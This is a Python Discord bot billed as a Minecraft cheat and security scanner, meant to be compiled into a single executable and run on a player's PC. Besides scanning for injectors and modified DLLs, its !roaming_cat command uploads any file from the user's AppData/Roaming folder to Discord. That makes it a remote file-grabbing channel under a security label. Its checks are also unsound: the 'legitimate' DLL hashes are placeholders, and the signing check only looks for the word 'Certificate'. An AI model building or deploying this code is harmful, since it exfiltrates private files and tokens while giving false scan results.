import os
import discord
from discord.ext import commands
from pathlib import Path
import asyncio
import sys
import time
import zipfile
import re
import pefile
import hashlib
import json
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
ROAMING_PATH = Path(os.getenv('APPDATA'))
RECYCLE_BIN_PATH = Path(os.getenv('USERPROFILE')) / '$Recycle.Bin'
deleted_files = {}
file_tracker = {}
THREAT_SIGNATURES = {
    "Doomsday": {
        "path": [
            r"versions/Doomsday/Doomsday\.jar",
            r"libraries/doomsday/",
            r"mods/Doomsday-\d+\.\d+\.\d+\.jar"
        ],
        "content": [
            b"Ldoomsday/",
            b"Lcom/doomsday/",
            b"Doomsday Client",
            b"doomsday.png",
            b"doomsday.properties",
            b"doomsdayclient.com"
        ]
    },
    "Doomsday Injector": {
        "path": [
            r"injector\.exe$",
            r"doomsday_inject\.dll",
            r"injectors/",
            r"doomsday_injector\.jar"
        ],
        "content": [
            b"DoomsdayInjector",
            b"inject_hook",
            b"process_attach"
        ]
    },
    "Ghost Client": {
        "path": [
            r"ghost\.jar$",
            r"ghostclient/",
            r"mods/GhostClient-\d+\.\d+\.\d+\.jar",
            r"versions/GhostClient/"
        ],
        "content": [
            b"Ghost Client",
            b"ghost_mode",
            b"render_ghost"
        ]
    },
    "Hidden Forge Mods": {
        "path": [
            r"forge_mods/.*\.jar$",
            r"mods/[0-9a-f]{32}\.jar$"
        ],
        "content": [
            b"@Mod(hidden=true)",
            b"@HiddenMod",
            b"forge_hidden_mod"
        ]
    },
    "Memory Injectors": {
        "path": [
            r"inject\.dll$",
            r"memory_injector\.exe",
            r"java_inject\.dll"
        ],
        "content": [
            b"VirtualAllocEx",
            b"WriteProcessMemory",
            b"CreateRemoteThread",
            b"LoadLibraryA"
        ]
    },
    "Process Hooks": {
        "path": [
            r"hook\.dll$",
            r"process_hooks\.dll",
            r"hook_system\.exe"
        ],
        "content": [
            b"SetWindowsHookEx",
            b"WH_KEYBOARD_LL",
            b"WH_MOUSE_LL",
            b"hook_procedure"
        ]
    },
    "DLL Modifications": {
        "path": [
            r"lwjgl\.dll$",
            r"openal\.dll$",
            r"jinput\.dll$"
        ],
        "content": [
            b"modified_dll",
            b"patched_function",
            b"detour_function"
        ]
    }
}
LEGITIMATE_HASHES = {
    "lwjgl.dll": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
    "openal.dll": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6",
    "jinput.dll": "e5f6a7b8c9d0e1f2a3b4c5d6a7b8c9d0"
}
def is_safe_path(child: Path, parent: Path) -> bool:
    try:
        child.resolve().relative_to(parent.resolve())
        return True
    except ValueError:
        return False
async def format_file_list(path: Path):
    if not path.exists():
        return None, "⛔ Directory not found"
    if not path.is_dir():
        return None, "⛔ Not a directory"
    dirs = []
    files = []
    with os.scandir(path) as entries:
        for entry in entries:
            if entry.is_dir():
                dirs.append(f"📁 {entry.name}/")
            elif entry.is_file():
                warning = ""
                name_l = entry.name.lower()
                if any(sig.lower() in name_l for sig in THREAT_SIGNATURES):
                    warning = " 🔥"
                elif entry.name.endswith(('.jar', '.exe', '.dll')):
                    warning = " ⚠️"
                files.append(f"📄 {entry.name}{warning}")
    items = sorted(dirs, key=str.lower) + sorted(files, key=str.lower)
    if not items:
        return None, "📁 Empty directory"
    return items, None
def scan_for_deleted_files():
    global deleted_files
    new_deleted = {}
    for path, _ in list(file_tracker.items()):
        if not path.exists() and path not in deleted_files:
            deleted_files[path] = time.time()
            new_deleted[path] = deleted_files[path]
    for path in list(file_tracker.keys()):
        if not path.exists():
            file_tracker.pop(path, None)
    return new_deleted
def _sync_scan_threats(root: Path):
    results = {"detected_threats": {}, "scan_summary": "🟢 No threats detected", "total_detections": 0}
    mc = root / '.minecraft'
    if not mc.exists():
        return results
    versions = mc / "versions"
    jars = []
    if versions.exists():
        for d in versions.iterdir():
            p = versions / f"{d.name}.jar"
            if p.exists():
                jars.append(p)
    mods = mc / "mods"
    if mods.exists():
        jars += list(mods.glob("*.jar"))
    dlls = list(mc.rglob("*.dll"))
    for threat, sigs in THREAT_SIGNATURES.items():
        detections = []
        patterns = [re.compile(p) for p in sigs["path"]]
        for fp in mc.rglob('*'):
            rel = str(fp.relative_to(mc)).replace("\\", "/")
            if any(p.search(rel) for p in patterns):
                detections.append(f"Path match: {rel}")
        for jar in jars:
            try:
                with zipfile.ZipFile(jar, 'r') as z:
                    for member in z.namelist():
                        if member.endswith('.class'):
                            data = z.read(member, 1024)
                            for sig in sigs["content"]:
                                if sig in data:
                                    detections.append(f"Class signature in {jar.name}: {sig.decode(errors='ignore')}")
                        if member.endswith(('.png', '.properties', '.json')):
                            mb = member.encode()
                            for sig in sigs["content"]:
                                if sig in mb:
                                    detections.append(f"Resource match in {jar.name}: {sig.decode(errors='ignore')}")
            except:
                continue
        for cfg in (mc / "options.txt", mc / "optionsof.txt", mc / "launcher_profiles.json"):
            if cfg.exists():
                try:
                    data = cfg.read_bytes()[:4096]
                    for sig in sigs["content"]:
                        if sig in data:
                            detections.append(f"Config signature in {cfg.name}: {sig.decode(errors='ignore')}")
                except:
                    pass
        for dll in dlls:
            try:
                pe = pefile.PE(dll, fast_load=True)
                if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
                        for imp in entry.imports:
                            if imp.name and any(s in imp.name for s in (b"WriteProcessMemory", b"CreateRemoteThread", b"SetWindowsHookEx", b"VirtualAllocEx")):
                                detections.append(f"Suspicious import in {dll.name}: {imp.name.decode(errors='ignore')}")
                if dll.name in LEGITIMATE_HASHES:
                    h = hashlib.md5(dll.read_bytes()).hexdigest()
                    if h != LEGITIMATE_HASHES[dll.name]:
                        detections.append(f"Modified DLL: {dll.name} (Hash: {h})")
            except:
                continue
        if detections:
            results["detected_threats"][threat] = detections
            results["total_detections"] += len(detections)
    if results["total_detections"] > 0:
        results["scan_summary"] = f"🔴 THREATS DETECTED: {', '.join(results['detected_threats'].keys())}"
    return results
async def detect_threats(root: Path):
    return await asyncio.to_thread(_sync_scan_threats, root)
@bot.event
async def on_ready():
    mc = ROAMING_PATH / '.minecraft'
    if mc.exists():
        for entry in mc.rglob('*'):
            file_tracker[entry] = entry.stat().st_mtime if entry.is_file() else time.time()
@bot.command(name='help')
async def custom_help(ctx):
    embed = discord.Embed(title="Advanced Minecraft Security Scanner", description="Comprehensive threat detection and file management", color=discord.Color.blue())
    cmds = [
        ("`!help`", "Show this help message"),
        ("`!roaming_ls [path]`", "List files in AppData/Roaming"),
        ("`!roaming_cat <file>`", "Send a file from AppData/Roaming"),
        ("`!mc_recent_deleted [hours]`", "Show recently deleted Minecraft files"),
        ("`!mc_find_deleted <name>`", "Search Recycle Bin for Minecraft files"),
        ("`!mc_restore <number>`", "Restore Minecraft file from search results"),
        ("`!detect_threats`", "Scan for all security threats"),
        ("`!deep_scan`", "Perform deep security analysis")
    ]
    for name, desc in cmds:
        embed.add_field(name=name, value=desc, inline=False)
    threats = "\n".join(f"- {t}" for t in THREAT_SIGNATURES)
    embed.add_field(name="🔒 Detected Threat Types", value=f"{threats}\n\nAdvanced detection: memory injection, process hooking, DLL mods, hidden mods.", inline=False)
    await ctx.send(embed=embed)
@bot.command(name='roaming_ls')
async def list_directory(ctx, *, path: str = '.'):
    try:
        target = (ROAMING_PATH / path).resolve()
        if not is_safe_path(target, ROAMING_PATH):
            return await ctx.send("⛔ Access denied: Path outside AppData/Roaming")
        if '.minecraft' in path:
            new_del = scan_for_deleted_files()
            if new_del:
                names = "\n".join(f"- {p.relative_to(ROAMING_PATH)}" for p in new_del)
                await ctx.send(f"🔥 **Recently Deleted Files:**\n{names}")
        items, error = await format_file_list(target)
        if error:
            return await ctx.send(error)
        msg = f"**Contents of `{path}`:**\n" + "\n".join(items)
        if len(msg) > 1500:
            with open('dir_list.txt', 'w', encoding='utf-8') as f:
                f.write(msg)
            await ctx.send(file=discord.File('dir_list.txt'))
            os.remove('dir_list.txt')
        else:
            await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"⚠️ Error listing directory: {e}")
@bot.command(name='roaming_cat')
async def send_file(ctx, *, file_path: str):
    try:
        target = (ROAMING_PATH / file_path).resolve()
        if not is_safe_path(target, ROAMING_PATH):
            return await ctx.send("⛔ Access denied: Path outside AppData/Roaming")
        if not target.exists():
            return await ctx.send("⛔ File not found!")
        if not target.is_file():
            return await ctx.send("⛔ This is a directory!")
        size_kb = target.stat().st_size // 1024
        if size_kb > 25 * 1024:
            return await ctx.send(f"⛔ File size ({size_kb}KB) exceeds 25MB")
        warning = ""
        ln = target.name.lower()
        for sig in THREAT_SIGNATURES:
            if sig.lower() in ln:
                warning = f"⚠️ **WARNING: Matches {sig} patterns!**\n"
                break
        await ctx.send(warning + f"**Sending file:** `{file_path}` ({size_kb}KB)")
        await ctx.send(file=discord.File(target))
    except Exception as e:
        await ctx.send(f"⚠️ Error sending file: {e}")

@bot.command(name='detect_threats')
async def scan_threats(ctx):
    try:
        msg = await ctx.send("🔍 Scanning for security threats...")
        results = await detect_threats(ROAMING_PATH)
        report = f"## Advanced Threat Scan Results\n**Status:** {results['scan_summary']}\n**Total Detections:** {results['total_detections']}\n\n"
        if results["total_detections"] > 0:
            report += "### 🔥 Detected Threats:\n"
            for t, dets in results["detected_threats"].items():
                report += f"#### {t}:\n" + "\n".join(f"- {d}" for d in dets[:3])
                if len(dets) > 3:
                    report += f"\n- ... and {len(dets)-3} more indicators\n"
                report += "\n"
            report += "\n**Recommendation:** Remove suspicious files immediately and run a full system scan!\n"
        else:
            report += "### 🛡️ No known threats detected\n**Note:** Advanced threats may still be present\n\n"
        report += "### Security Best Practices:\n- Only install mods from trusted sources\n- Regularly update your security software\n- Enable two-factor authentication\n- Perform regular security scans\n"
        await msg.delete()
        if len(report) > 1500:
            with open('threat_report.txt', 'w', encoding='utf-8') as f:
                f.write(report)
            await ctx.send(file=discord.File('threat_report.txt'))
            os.remove('threat_report.txt')
        else:
            await ctx.send(report)
    except Exception as e:
        await ctx.send(f"⚠️ Error during threat scan: {e}")
@bot.command(name='deep_scan')
async def deep_scan(ctx):
    try:
        msg = await ctx.send("🔍 Starting deep security analysis...")
        threat_results = await detect_threats(ROAMING_PATH)
        mc = ROAMING_PATH / '.minecraft'
        suspicious = []
        if mc.exists():
            for f in mc.rglob('*'):
                if f.is_file():
                    if re.match(r'^[0-9a-f]{32}\.[a-z]+$', f.name):
                        suspicious.append(f"- 🤔 Obfuscated file: {f.name}")
                    if f.name.startswith('.'):
                        suspicious.append(f"- 🕶️ Hidden file: {f.name}")
            bins = list(mc.rglob('*.exe')) + list(mc.rglob('*.dll'))
            for bf in bins:
                try:
                    data = bf.read_bytes()[:1024]
                    if b"Certificate" not in data:
                        suspicious.append(f"- 📛 Unsigned binary: {bf.name}")
                except:
                    continue
            lp = mc / "launcher_profiles.json"
            if lp.exists():
                try:
                    profs = json.loads(lp.read_text())
                    for p in profs.get('profiles', {}).values():
                        args = p.get('javaArgs', '')
                        if any(flag in args for flag in ('-javaagent:', '-Xbootclasspath')):
                            suspicious.append(f"- ⚠️ Suspicious JVM args: {args[:50]}...")
                except:
                    pass
        report = f"## 🔍 Deep Security Analysis Report\n### Threat Detection: {threat_results['scan_summary']}\n"
        if threat_results['total_detections']:
            report += f"**Total Indicators:** {threat_results['total_detections']}\n"
            report += "".join(f"- {t}\n" for t in threat_results['detected_threats'])
        if suspicious:
            report += "\n### 🧩 Suspicious Findings:\n" + "\n".join(suspicious[:10])
            if len(suspicious) > 10:
                report += f"\n... and {len(suspicious)-10} more items"
        else:
            report += "\n### 🟢 No additional suspicious findings"
        risk = min(100, threat_results['total_detections'] * 10 + len(suspicious) * 5)
        report += f"\n\n### 🔒 Security Score: {100 - risk}/100\n\n### 🛡️ Recommendations:\n"
        if risk > 30:
            report += "1. **Remove** all detected threats immediately\n2. **Scan** with antivirus software\n3. **Reset** Minecraft to default settings\n4. **Change** your account password\n5. **Consider** a full system reinstall\n"
        else:
            report += "1. Keep Minecraft installation clean\n2. Install mods only from trusted sources\n3. Update security software regularly\n4. Enable two-factor authentication\n"
        await msg.delete()
        if len(report) > 2000:
            with open('security_report.txt', 'w', encoding='utf-8') as f:
                f.write(report)
            await ctx.send(file=discord.File('security_report.txt'))
            os.remove('security_report.txt')
        else:
            await ctx.send(report)
    except Exception as e:
        await ctx.send(f"⚠️ Error during deep scan: {e}")
# Replace with your own Discord Bot token
if __name__ == "__main__":
    bot.run('Discord-Bot-Token')

### Then Download all the Libs and Compile it with PyInstaller and enable the console when compiling!!!! and that its only one file
